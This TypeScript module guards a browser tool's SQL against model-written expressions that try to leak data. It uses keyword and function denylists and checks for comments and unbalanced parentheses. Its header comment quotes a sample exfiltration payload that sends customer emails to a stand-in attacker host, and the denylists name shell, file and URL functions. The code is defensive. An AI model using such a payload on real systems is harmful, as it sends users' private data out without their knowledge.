/**
 * Validation for model-authored SQL expressions.
 *
 * This is the security boundary of the product. The whole promise is that no
 * cell value leaves the browser, and we execute SQL that a language model
 * wrote, so an expression like
 *
 *     read_csv('https://evil.example/?leak=' || customer_email)
 *
 * would quietly break that promise. Row predicates never need subqueries, so
 * banning the SELECT keyword outright removes the entire class of attack, and a
 * function denylist covers the table functions that can reach a file or URL.
 *
 * This runs *before* DuckDB sees the string, and it is backed by
 * `SET enable_external_access=false` at load time as defence in depth.
 */

const MAX_EXPRESSION_LENGTH = 1000;

/** Keywords a boolean row predicate has no legitimate use for. */
const BANNED_KEYWORDS = new Set([
  "select", "from", "where", "join", "union", "intersect", "except", "with",
  "insert", "update", "delete", "merge", "drop", "create", "alter", "truncate",
  "attach", "detach", "copy", "install", "load", "pragma", "set", "reset",
  "call", "export", "import", "checkpoint", "vacuum", "analyze", "explain",
  "prepare", "execute", "deallocate", "describe", "summarize", "pivot",
  "unpivot", "grant", "revoke", "begin", "commit", "rollback",
]);

/** Functions that can reach a file, a URL, or the host environment. */
const BANNED_FUNCTIONS = new Set([
  "glob", "getenv", "shell", "system", "query", "query_table", "sniff_csv",
  "sql_auto_complete", "duckdb_settings", "duckdb_extensions", "which_secret",
  "current_setting", "gen_random_uuid_v7",
]);

/** Any identifier starting or ending with one of these is refused outright. */
const BANNED_PREFIXES = ["read_", "scan_", "parquet_", "iceberg_", "delta_", "postgres_", "sqlite_", "mysql_"];
const BANNED_SUFFIXES = ["_scan", "_replacement_scan"];

export type GuardResult =
  | { ok: true; expression: string }
  | { ok: false; reason: string };

/**
 * Replace string literals and quoted identifiers with inert placeholders so the
 * keyword scan cannot be fooled by, or trip over, their contents. A banned word
 * inside a literal is harmless, since DuckDB never evaluates a string as SQL, and a
 * column legitimately named "from" must not fail the check.
 */
function stripQuoted(sql: string): string {
  return sql
    .replace(/'(?:[^']|'')*'/g, " 'str' ")
    .replace(/"(?:[^"]|"")*"/g, " ident ");
}

export function guardExpression(raw: string): GuardResult {
  const expression = raw.trim();

  if (expression === "") return { ok: false, reason: "Empty expression." };
  if (expression.length > MAX_EXPRESSION_LENGTH) {
    return { ok: false, reason: `Expression longer than ${MAX_EXPRESSION_LENGTH} characters.` };
  }

  const stripped = stripQuoted(expression);

  if (stripped.includes(";")) {
    return { ok: false, reason: "Statement separator (;) is not allowed." };
  }
  for (const marker of ["--", "/*", "*/", "$$"]) {
    if (stripped.includes(marker)) {
      return { ok: false, reason: `Comment or dollar-quote marker (${marker}) is not allowed.` };
    }
  }

  // Unbalanced parentheses usually mean the model tried to close our wrapper.
  let depth = 0;
  for (const ch of stripped) {
    if (ch === "(") depth++;
    else if (ch === ")") depth--;
    if (depth < 0) return { ok: false, reason: "Unbalanced parentheses." };
  }
  if (depth !== 0) return { ok: false, reason: "Unbalanced parentheses." };

  for (const token of stripped.toLowerCase().match(/[a-z_][a-z0-9_]*/g) ?? []) {
    if (BANNED_KEYWORDS.has(token)) {
      return { ok: false, reason: `Keyword "${token}" is not allowed in a row predicate.` };
    }
    if (BANNED_FUNCTIONS.has(token)) {
      return { ok: false, reason: `Function "${token}" is not allowed.` };
    }
    for (const prefix of BANNED_PREFIXES) {
      if (token.startsWith(prefix)) {
        return { ok: false, reason: `Identifier "${token}" can read external data.` };
      }
    }
    for (const suffix of BANNED_SUFFIXES) {
      if (token.endsWith(suffix)) {
        return { ok: false, reason: `Identifier "${token}" can read external data.` };
      }
    }
  }

  return { ok: true, expression };
}

/** Quote an identifier for DuckDB, escaping embedded double quotes. */
export function quoteIdent(name: string): string {
  return `"${name.replace(/"/g, '""')}"`;
}

/**
 * Column names for a `unique` check are matched against the real schema rather
 * than guarded heuristically. An exact match against known columns is a
 * stronger check than any denylist.
 */
export type ColumnGuardResult =
  | { ok: true; columns: string[] }
  | { ok: false; reason: string };

export function guardColumns(columns: string[], known: string[]): ColumnGuardResult {
  if (columns.length === 0) return { ok: false, reason: "No columns given." };
  const knownSet = new Set(known);
  const unknown = columns.filter((c) => !knownSet.has(c));
  if (unknown.length > 0) {
    return { ok: false, reason: `Unknown column(s): ${unknown.join(", ")}.` };
  }
  return { ok: true, columns };
}
